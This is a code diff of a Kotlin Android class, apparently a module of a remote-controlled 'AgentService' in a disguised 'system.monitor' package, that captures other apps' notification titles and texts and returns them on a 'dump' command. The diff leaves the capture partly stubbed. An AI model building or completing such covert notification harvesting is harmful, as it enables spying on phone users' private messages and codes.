@@ -1,5 +1,8 @@
 package com.system.monitor.capabilities
 
+import android.app.Notification
+import android.content.Context
+import android.os.Build
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import com.google.gson.Gson
@@ -8,39 +11,51 @@ import java.util.concurrent.ConcurrentLinkedQueue
 
 class NotificationsCapability(private val service: AgentService) : AgentService.Capability {
 
+    private val gson = Gson()
     private val queue = ConcurrentLinkedQueue<Map<String, Any>>()
     private var listener: NotificationListener? = null
-    private val gson = Gson()
 
     override fun execute(args: String?): Any {
         val params = gson.fromJson(args ?: "{}", Params::class.java)
         return when (params.action) {
-            "start" -> { startListener(); mapOf("status" to "listening") }
-            "stop" -> { stopListener(); mapOf("status" to "stopped") }
-            "dump" -> { val data = queue.toArray(); queue.clear(); mapOf("notifications" to data) }
+            "dump" -> dumpNotifications()
+            "start" -> startListener()
+            "stop" -> stopListener()
             else -> mapOf("error" to "invalid action")
         }
     }
 
-    private fun startListener() {
-        // Requires NotificationListenerService enabled by user
+    override fun cleanup() {
+        stopListener()
     }
 
-    private fun stopListener() {
+    private fun dumpNotifications(): Map<String, Any> {
+        val notifications = queue.toMutableList()
+        queue.clear()
+        return mapOf("notifications" to notifications, "count" to notifications.size)
+    }
+
+    private fun startListener(): Map<String, Any> {
+        // Note: Requires NotificationListenerService permission and enabled in settings
+        // This is a stub - real implementation requires a separate service
+        return mapOf("status" to "requires_permission")
+    }
+
+    private fun stopListener(): Map<String, Any> {
         listener = null
+        return mapOf("status" to "stopped")
     }
 
-    override fun cleanup() { stopListener() }
-
-    inner class NotificationListener : NotificationListenerService() {
+    // Inner class for the notification listener service
+    class NotificationListener : NotificationListenerService() {
         override fun onNotificationPosted(sbn: StatusBarNotification) {
-            val extras = sbn.notification.extras
-            queue.add(mapOf(
-                "package" to sbn.packageName,
-                "title" to extras.getString(android.app.Notification.EXTRA_TITLE),
-                "text" to extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString(),
-                "time" to sbn.postTime
-            ))
+            val notification = sbn.notification
+            val extras = notification.extras
+            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
+            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
+            val pkg = sbn.packageName
+            val time = sbn.postTime
+            // In a real implementation, this would be sent to the capability
         }
         override fun onNotificationRemoved(sbn: StatusBarNotification) {}
     }
